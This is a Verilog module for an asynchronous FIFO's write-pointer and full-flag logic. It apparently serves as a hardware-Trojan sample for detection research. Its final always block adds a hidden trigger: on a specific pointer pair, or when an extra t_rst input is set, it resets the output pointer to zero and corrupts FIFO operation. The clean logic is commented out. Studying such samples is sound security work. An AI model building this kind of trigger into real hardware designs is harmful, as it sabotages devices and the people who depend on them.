module wptr_full_trojan #(parameter ADDRSIZE = 4) (
    output reg wfull,
    output [ADDRSIZE-1:0] waddr,
    output reg [ADDRSIZE:0] wptr,
    input [ADDRSIZE:0] wq2_rptr,
    input winc, wclk, wrst_n, t_rst
);

    reg [ADDRSIZE:0] wbin, wbinnext_t;
    wire [ADDRSIZE:0] wgraynext, wbinnext;
    reg [ADDRSIZE:0] wptr_trojan; // Trojan output


    // GRAYSTYLE2 pointer
    always @(posedge wclk or negedge wrst_n) begin
        if (!wrst_n) begin
            {wbin, wptr} <= 0;
        end else begin
           {wbin, wptr} <= {wbinnext, wptr_trojan};
           //{wbin, wptr} <= {wbinnext, wgraynext};
        end
    end

    // Memory write-address pointer
    assign waddr = wbin[ADDRSIZE-1:0];
    assign wbinnext = wbin + (winc & ~wfull);
    assign wgraynext = (wbinnext >> 1) ^ wbinnext;

    assign wfull_val = (wgraynext == {~wq2_rptr[ADDRSIZE:ADDRSIZE-1], wq2_rptr[ADDRSIZE-2:0]});
    always @(posedge wclk or negedge wrst_n) begin
        if (!wrst_n) begin
            wfull <= 1'b0;
        end else begin
            wfull <= wfull_val;
        end
    end
   always @(posedge wclk or posedge wrst_n) begin
  if (t_rst) begin
    wptr_trojan <= 5'b00000;
  end else if (wptr == 5'b01110 && wq2_rptr == 5'b00001) begin
    wptr_trojan <= 5'b00000;
   // wbinnext_t <= 0;
  end else begin
    wptr_trojan <= wgraynext;
    //wbinnext_t <= wbinnext;
  end
end

endmodule